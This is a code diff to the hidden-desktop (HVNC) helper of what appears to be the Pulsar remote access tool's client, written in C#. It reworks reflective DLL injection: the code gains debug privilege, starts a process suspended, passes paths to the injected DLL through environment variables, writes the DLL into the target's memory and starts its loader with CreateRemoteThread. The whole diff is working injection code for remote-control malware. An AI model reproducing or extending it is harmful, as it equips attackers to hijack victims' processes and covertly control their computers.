@@ -1,6 +1,8 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 
@@ -38,14 +40,14 @@ namespace Pulsar.Client.Helper.HVNC
                 }
 
                 Debug.WriteLine($"[*] Starting reflective DLL injection");
-                Debug.WriteLine($" Target: {exePath}");
+                Debug.WriteLine($"    Target: {exePath}");
                 Debug.WriteLine($"    Search Pattern: {searchPattern}");
                 Debug.WriteLine($"    Replacement Path: {replacementPath}");
                 Debug.WriteLine($"    DLL Size: {dllBytes.Length} bytes");
 
                 PrivilegeManager.EnableDebugPrivilege();
 
-                var (process, hProcess, hThread) = ProcessManager.StartProcessSuspended(exePath);
+                var (process, hProcess, hThread) = ProcessManager.StartProcessSuspended(exePath, searchPattern, replacementPath);
                 if (process == null || hProcess == IntPtr.Zero || hThread == IntPtr.Zero)
                 {
                     Debug.WriteLine("[-] Failed to create suspended process");
@@ -57,9 +59,7 @@ namespace Pulsar.Client.Helper.HVNC
 
                 try
                 {
-                    string paramString = $"{searchPattern}|{replacementPath}";
-
-                    bool success = Injector.InjectDllWithHandle(hProcess, dllBytes, paramString);
+                    bool success = Injector.InjectDllWithHandle(hProcess, dllBytes);
                     if (success)
                     {
                         Debug.WriteLine($"[+] Successfully injected '{Path.GetFileName(exePath)}' into process {processId}");
@@ -153,6 +153,7 @@ namespace Pulsar.Client.Helper.HVNC
         }
 
         private const uint CREATE_SUSPENDED = 0x00000004;
+        private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
 
         public static Process StartProcessNormal(string exePath)
         {
@@ -181,13 +182,44 @@ namespace Pulsar.Client.Helper.HVNC
             }
         }
 
-        public static (Process process, IntPtr hProcess, IntPtr hThread) StartProcessSuspended(string exePath)
+        private static IntPtr CreateEnvironmentBlock(string searchPath, string replacePath)
+        {
+            var envVars = Environment.GetEnvironmentVariables();
+
+            var envDict = new Dictionary<string, string>();
+            foreach (System.Collections.DictionaryEntry entry in envVars)
+            {
+                envDict[entry.Key.ToString()] = entry.Value.ToString();
+            }
+
+            envDict["RDI_SEARCH_PATH"] = searchPath;
+            envDict["RDI_REPLACE_PATH"] = replacePath;
+
+            var envList = new List<string>();
+            foreach (var kvp in envDict.OrderBy(x => x.Key, StringComparer.OrdinalIgnoreCase))
+            {
+                envList.Add($"{kvp.Key}={kvp.Value}");
+            }
+
+            string envBlock = string.Join("\0", envList) + "\0\0";
+
+            byte[] envBytes = Encoding.Unicode.GetBytes(envBlock);
+
+            IntPtr envPtr = Marshal.AllocHGlobal(envBytes.Length);
+            Marshal.Copy(envBytes, 0, envPtr, envBytes.Length);
+
+            return envPtr;
+        }
+
+        public static (Process process, IntPtr hProcess, IntPtr hThread) StartProcessSuspended(string exePath, string searchPath, string replacePath)
         {
             if (!File.Exists(exePath))
             {
-                Console.WriteLine($"[-] Executable not found: {exePath}");
+                Debug.WriteLine($"[-] Executable not found: {exePath}");
                 return (null, IntPtr.Zero, IntPtr.Zero);
             }
+
+            IntPtr envBlock = IntPtr.Zero;
 
             try
             {
@@ -198,14 +230,20 @@ namespace Pulsar.Client.Helper.HVNC
 
                 string commandLine = $"\"{exePath}\"";
 
+                envBlock = CreateEnvironmentBlock(searchPath, replacePath);
+
+                Debug.WriteLine($"[*] Setting environment variables:");
+                Debug.WriteLine($"  RDI_SEARCH_PATH={searchPath}");
+                Debug.WriteLine($"  RDI_REPLACE_PATH={replacePath}");
+
                 bool success = CreateProcess(
                     null,
                     commandLine,
                     IntPtr.Zero,
                     IntPtr.Zero,
                     false,
-                    CREATE_SUSPENDED,
-                    IntPtr.Zero,
+                    CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT,
+                    envBlock,
                     Path.GetDirectoryName(exePath),
                     ref si,
                     out pi);
@@ -213,7 +251,7 @@ namespace Pulsar.Client.Helper.HVNC
                 if (!success)
                 {
                     int error = Marshal.GetLastWin32Error();
-                    Console.WriteLine($"[-] Failed to create process. Error: {error}");
+                    Debug.WriteLine($"[-] Failed to create process. Error: {error}");
                     return (null, IntPtr.Zero, IntPtr.Zero);
                 }
 
@@ -223,8 +261,15 @@ namespace Pulsar.Client.Helper.HVNC
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[-] Failed to start process: {ex.Message}");
+                Debug.WriteLine($"[-] Failed to start process: {ex.Message}");
                 return (null, IntPtr.Zero, IntPtr.Zero);
+            }
+            finally
+            {
+                if (envBlock != IntPtr.Zero)
+                {
+                    Marshal.FreeHGlobal(envBlock);
+                }
             }
         }
 
@@ -235,7 +280,7 @@ namespace Pulsar.Client.Helper.HVNC
                 uint suspendCount = ResumeThread(hThread);
                 if (suspendCount == unchecked((uint)-1))
                 {
-                    Console.WriteLine($"[-] Failed to resume thread. Error: {Marshal.GetLastWin32Error()}");
+                    Debug.WriteLine($"[-] Failed to resume thread. Error: {Marshal.GetLastWin32Error()}");
                 }
             }
         }
@@ -370,55 +415,6 @@ namespace Pulsar.Client.Helper.HVNC
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool CloseHandle(IntPtr hObject);
 
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        private static extern bool CreateProcess(
-            string lpApplicationName,
-            string lpCommandLine,
-            IntPtr lpProcessAttributes,
-            IntPtr lpThreadAttributes,
-            bool bInheritHandles,
-            uint dwCreationFlags,
-            IntPtr lpEnvironment,
-            string lpCurrentDirectory,
-            ref STARTUPINFO lpStartupInfo,
-            out PROCESS_INFORMATION lpProcessInformation);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern uint ResumeThread(IntPtr hThread);
-
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        private struct STARTUPINFO
-        {
-            public int cb;
-            public string lpReserved;
-            public string lpDesktop;
-            public string lpTitle;
-            public int dwX;
-            public int dwY;
-            public int dwXSize;
-            public int dwYSize;
-            public int dwXCountChars;
-            public int dwYCountChars;
-            public int dwFillAttribute;
-            public int dwFlags;
-            public short wShowWindow;
-            public short cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public int dwProcessId;
-            public int dwThreadId;
-        }
-
-        private const uint CREATE_SUSPENDED = 0x00000004;
         private const uint INFINITE = 0xFFFFFFFF;
 
         [Flags]
@@ -451,44 +447,13 @@ namespace Pulsar.Client.Helper.HVNC
             IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, processId);
             if (hProcess == IntPtr.Zero)
             {
-                Console.WriteLine($"[-] Failed to open target process. Error={Marshal.GetLastWin32Error()}");
-                return false;
-            }
-
-            try
-            {
-                // Hardcoded replacement string for now
-                string replacementString = "KDOT";
-
-                IntPtr hThread = LoadRemoteLibraryR(hProcess, dllBuffer, replacementString);
-                if (hThread == IntPtr.Zero)
-                {
-                    Console.WriteLine($"[-] Failed to inject DLL. Error={Marshal.GetLastWin32Error()}");
-                    return false;
-                }
-
-                WaitForSingleObject(hThread, INFINITE);
-                CloseHandle(hThread);
-                return true;
-            }
-            finally
-            {
-                CloseHandle(hProcess);
-            }
-        }
-
-        public static bool InjectDllIntoRunningProcess(int processId, byte[] dllBuffer, string parameter)
-        {
-            IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, processId);
-            if (hProcess == IntPtr.Zero)
-            {
                 Debug.WriteLine($"[-] Failed to open target process. Error={Marshal.GetLastWin32Error()}");
                 return false;
             }
 
             try
             {
-                IntPtr hThread = LoadRemoteLibraryR(hProcess, dllBuffer, parameter, false);
+                IntPtr hThread = LoadRemoteLibraryR(hProcess, dllBuffer);
                 if (hThread == IntPtr.Zero)
                 {
                     Debug.WriteLine($"[-] Failed to inject DLL. Error={Marshal.GetLastWin32Error()}");
@@ -505,7 +470,7 @@ namespace Pulsar.Client.Helper.HVNC
             }
         }
 
-        public static bool InjectDllWithHandle(IntPtr hProcess, byte[] dllBuffer, string replacementString)
+        public static bool InjectDllWithHandle(IntPtr hProcess, byte[] dllBuffer)
         {
             if (hProcess == IntPtr.Zero || dllBuffer == null || dllBuffer.Length == 0)
             {
@@ -513,7 +478,7 @@ namespace Pulsar.Client.Helper.HVNC
                 return false;
             }
 
-            IntPtr hThread = LoadRemoteLibraryR(hProcess, dllBuffer, replacementString, false);
+            IntPtr hThread = LoadRemoteLibraryR(hProcess, dllBuffer);
             if (hThread == IntPtr.Zero)
             {
                 Debug.WriteLine($"[-] Failed to inject DLL. Error={Marshal.GetLastWin32Error()}");
@@ -525,28 +490,8 @@ namespace Pulsar.Client.Helper.HVNC
             return true;
         }
 
-        public static IntPtr InjectDllWithHandleSuspended(IntPtr hProcess, byte[] dllBuffer, string replacementString)
+        private static IntPtr LoadRemoteLibraryR(IntPtr hProcess, byte[] buffer)
         {
-            if (hProcess == IntPtr.Zero || dllBuffer == null || dllBuffer.Length == 0)
-            {
-                Console.WriteLine("[-] Invalid parameters for injection");
-                return IntPtr.Zero;
-            }
-
-            IntPtr hThread = LoadRemoteLibraryR(hProcess, dllBuffer, replacementString, true);
-            if (hThread == IntPtr.Zero)
-            {
-                Console.WriteLine($"[-] Failed to inject DLL. Error={Marshal.GetLastWin32Error()}");
-                return IntPtr.Zero;
-            }
-
-            return hThread;
-        }
-
-        private static IntPtr LoadRemoteLibraryR(IntPtr hProcess, byte[] buffer, string parameter, bool createSuspended = false)
-        {
-            IntPtr lpRemoteParameter = IntPtr.Zero;
-
             try
             {
                 if (hProcess == IntPtr.Zero || buffer == null || buffer.Length == 0)
@@ -555,7 +500,7 @@ namespace Pulsar.Client.Helper.HVNC
                 uint reflectiveLoaderOffset = PEParser.GetReflectiveLoaderOffset(buffer);
                 if (reflectiveLoaderOffset == 0)
                 {
-                    Console.WriteLine("[-] Failed to find ReflectiveLoader in DLL");
+                    Debug.WriteLine("[-] Failed to find ReflectiveLoader in DLL");
                     return IntPtr.Zero;
                 }
 
@@ -568,52 +513,34 @@ namespace Pulsar.Client.Helper.HVNC
 
                 if (lpRemoteLibraryBuffer == IntPtr.Zero)
                 {
-                    Console.WriteLine("[-] Failed to allocate memory in remote process");
+                    Debug.WriteLine("[-] Failed to allocate memory in remote process");
                     return IntPtr.Zero;
                 }
 
                 IntPtr bytesWritten;
                 if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, buffer, (uint)buffer.Length, out bytesWritten))
                 {
-                    Console.WriteLine("[-] Failed to write DLL to remote process");
+                    Debug.WriteLine("[-] Failed to write DLL to remote process");
                     return IntPtr.Zero;
-                }
-
-                if (!string.IsNullOrEmpty(parameter))
-                {
-                    byte[] paramBytes = Encoding.Unicode.GetBytes(parameter + "\0");
-                    lpRemoteParameter = VirtualAllocEx(
-                        hProcess,
-                        IntPtr.Zero,
-                        (uint)paramBytes.Length,
-                        AllocationType.MEM_RESERVE | AllocationType.MEM_COMMIT,
-                        MemoryProtection.PAGE_READWRITE);
-
-                    if (lpRemoteParameter != IntPtr.Zero)
-                    {
-                        WriteProcessMemory(hProcess, lpRemoteParameter, paramBytes, (uint)paramBytes.Length, out bytesWritten);
-                        Console.WriteLine($"[+] Passed parameter '{parameter}' to DLL");
-                    }
                 }
 
                 IntPtr lpReflectiveLoader = IntPtr.Add(lpRemoteLibraryBuffer, (int)reflectiveLoaderOffset);
 
-                uint creationFlags = createSuspended ? CREATE_SUSPENDED : 0;
                 IntPtr threadId;
                 IntPtr hThread = CreateRemoteThread(
                     hProcess,
                     IntPtr.Zero,
                     1024 * 1024,
                     lpReflectiveLoader,
-                    lpRemoteParameter,
-                    creationFlags,
+                    IntPtr.Zero,
+                    0,
                     out threadId);
 
                 return hThread;
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[-] Exception in LoadRemoteLibraryR: {ex.Message}");
+                Debug.WriteLine($"[-] Exception in LoadRemoteLibraryR: {ex.Message}");
                 return IntPtr.Zero;
             }
         }
